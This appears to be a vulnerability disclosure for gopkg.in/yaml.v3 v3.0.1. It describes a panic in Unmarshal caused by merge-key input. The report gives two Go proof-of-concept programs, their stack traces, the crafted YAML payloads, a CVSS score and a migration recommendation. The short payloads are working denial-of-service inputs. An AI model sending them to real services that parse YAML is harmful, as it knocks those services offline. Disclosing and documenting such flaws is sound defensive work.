# Vulnerability Report: go-yaml/yaml (gopkg.in/yaml.v3 v3.0.1)

## Summary

Deserialization of Untrusted Data vulnerability in go-yaml/yaml gopkg.In/yaml.V3 package (Unmarshal() function). Input data can cause a crash (panic).

## Affected Product

- **Vendor / project:** `go-yaml/yaml`
- **Source link:** https://github.com/go-yaml/yaml
- **Package:** `gopkg.in/yaml.v3`
- **Affected versions:** `3.0.1 (latest, project is archived)`
- **Fixed version:** `-`
- **Language / ecosystem:** `Golang`

## Vulnerability Type

- **CWE:** `CWE-502 Deserialization of Untrusted Data`
- **Type:** `Incorrect unmarshaling`

## Description

Package gopkg.In/yaml.V3 versions 3.0.1 contain a Deserialization of Untrusted Data vulnerability.
The vulnerability occurs because data passed to the unmarshaling function is processed incorrectly.

## Impact

An attacker controlling user input can craft a specially designed request that leads to a DoS (denial of service).

## Proof of Concept

The type of suitable payload depends on the data type into which unmarshaling is performed. Below are two examples involving different commonly encountered data types.

### Case 1. interface{}

Source code:
```Golang
package main

import(
	"gopkg.in/yaml.v3"
)

func main() {
	payload := []byte("0:\n<<:\r ? 0:")
	var raw interface{}

	_ = yaml.Unmarshal(payload, &raw)
}
```

Result:
```
panic: runtime error: hash of unhashable type map[interface {}]interface {} [recovered]
        panic: runtime error: hash of unhashable type map[interface {}]interface {}

goroutine 1 [running]:
gopkg.in/yaml%2ev3.handleErr(0xc0000c3e98)
        /home/fuzzuser/go/pkg/mod/gopkg.in/yaml.v3@v3.0.1/yaml.go:294 +0x6d
panic({0x507c80?, 0xc000014230?})
        /home/fuzzuser/tools/go/src/runtime/panic.go:791 +0x132
gopkg.in/yaml%2ev3.(*decoder).mapping(0xc0000bb5e0, 0xc0000c65a0, {0x507260?, 0xc00009e5a0?, 0xc0000141f0?})
        /home/fuzzuser/go/pkg/mod/gopkg.in/yaml.v3@v3.0.1/decode.go:835 +0x876
gopkg.in/yaml%2ev3.(*decoder).unmarshal(0xc0000bb5e0, 0xc0000c65a0, {0x507260?, 0xc00009e5a0?, 0x505f40?})
        /home/fuzzuser/go/pkg/mod/gopkg.in/yaml.v3@v3.0.1/decode.go:510 +0x3ea
gopkg.in/yaml%2ev3.(*decoder).merge(0xc0000bb5e0, 0xc0000c6320?, 0xc0000c65a0, {0x507260?, 0xc00009e5a0?, 0x194?})
        /home/fuzzuser/go/pkg/mod/gopkg.in/yaml.v3@v3.0.1/decode.go:973 +0x230
gopkg.in/yaml%2ev3.(*decoder).mapping(0xc0000bb5e0, 0xc0000c6320, {0x505f40?, 0xc000014170?, 0x0?})
        /home/fuzzuser/go/pkg/mod/gopkg.in/yaml.v3@v3.0.1/decode.go:856 +0xb7f
gopkg.in/yaml%2ev3.(*decoder).unmarshal(0xc0000bb5e0, 0xc0000c6320, {0x505f40?, 0xc000014170?, 0x4d39e5?})
        /home/fuzzuser/go/pkg/mod/gopkg.in/yaml.v3@v3.0.1/decode.go:510 +0x3ea
gopkg.in/yaml%2ev3.(*decoder).document(...)
        /home/fuzzuser/go/pkg/mod/gopkg.in/yaml.v3@v3.0.1/decode.go:527
gopkg.in/yaml%2ev3.(*decoder).unmarshal(0xc0000bb5e0, 0xc0000c6280, {0x505f40?, 0xc000014170?, 0x78585a755248?})
        /home/fuzzuser/go/pkg/mod/gopkg.in/yaml.v3@v3.0.1/decode.go:498 +0x28a
gopkg.in/yaml%2ev3.unmarshal({0xc000012610, 0xc, 0xc}, {0x4fee80, 0xc000014170}, 0x88?)
        /home/fuzzuser/go/pkg/mod/gopkg.in/yaml.v3@v3.0.1/yaml.go:167 +0x396
gopkg.in/yaml%2ev3.Unmarshal(...)
        /home/fuzzuser/go/pkg/mod/gopkg.in/yaml.v3@v3.0.1/yaml.go:89
main.main()
        /home/fuzzuser/fuzz-projects+/testVuln/main.go:11 +0x65
exit status 2
```

### Case 2. map[string]string

Source code:
```Golang
package main

import(
	"gopkg.in/yaml.v3"
)

func main() {
	payload := []byte("<<:\r? 0:")
	var raw map[string]string

	_ = yaml.Unmarshal(payload, &raw)
}
```

Result:
```
panic: runtime error: hash of unhashable type map[interface {}]interface {} [recovered]
        panic: runtime error: hash of unhashable type map[interface {}]interface {}

goroutine 1 [running]:
gopkg.in/yaml%2ev3.handleErr(0xc0000c3e98)
        /home/fuzzuser/go/pkg/mod/gopkg.in/yaml.v3@v3.0.1/yaml.go:294 +0x6d
panic({0x507c60?, 0xc000014210?})
        /home/fuzzuser/tools/go/src/runtime/panic.go:791 +0x132
gopkg.in/yaml%2ev3.(*decoder).merge(0xc0000bb5e0, 0xc0000c6320, 0xc0000c6460, {0x507120?, 0xc000070050?, 0x46b05e?})
        /home/fuzzuser/go/pkg/mod/gopkg.in/yaml.v3@v3.0.1/decode.go:966 +0x1a5
gopkg.in/yaml%2ev3.(*decoder).mapping(0xc0000bb5e0, 0xc0000c6320, {0x507120?, 0xc000070050?, 0x0?})
        /home/fuzzuser/go/pkg/mod/gopkg.in/yaml.v3@v3.0.1/decode.go:856 +0xb7f
gopkg.in/yaml%2ev3.(*decoder).unmarshal(0xc0000bb5e0, 0xc0000c6320, {0x507120?, 0xc000070050?, 0x4d39e5?})
        /home/fuzzuser/go/pkg/mod/gopkg.in/yaml.v3@v3.0.1/decode.go:510 +0x3ea
gopkg.in/yaml%2ev3.(*decoder).document(...)
        /home/fuzzuser/go/pkg/mod/gopkg.in/yaml.v3@v3.0.1/decode.go:527
gopkg.in/yaml%2ev3.(*decoder).unmarshal(0xc0000bb5e0, 0xc0000c6280, {0x507120?, 0xc000070050?, 0x70e2bc5e7268?})
        /home/fuzzuser/go/pkg/mod/gopkg.in/yaml.v3@v3.0.1/decode.go:498 +0x28a
gopkg.in/yaml%2ev3.unmarshal({0xc000012608, 0x8, 0x8}, {0x500080, 0xc000070050}, 0x88?)
        /home/fuzzuser/go/pkg/mod/gopkg.in/yaml.v3@v3.0.1/yaml.go:167 +0x396
gopkg.in/yaml%2ev3.Unmarshal(...)
        /home/fuzzuser/go/pkg/mod/gopkg.in/yaml.v3@v3.0.1/yaml.go:89
main.main()
        /home/fuzzuser/fuzz-projects+/testVuln/main.go:11 +0x58
exit status 2
```

Experiments were conducted using various types of data. In all cases, one of the payloads caused a panic:
- `0:\n<<:\r ? 0:`
- `<<:\r? 0:`

**Expected secure behavior:**

The function is expected to process the input data and execute successfully (with or without an error).

## Severity

**CVSS v3.1 base score:** `7.5` — `High`

```text
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
```

## Mitigations

As this project is archived, it is recommended to use secure, supported alternatives (e.g., sigs.k8s.io/yaml/goyaml.v3).
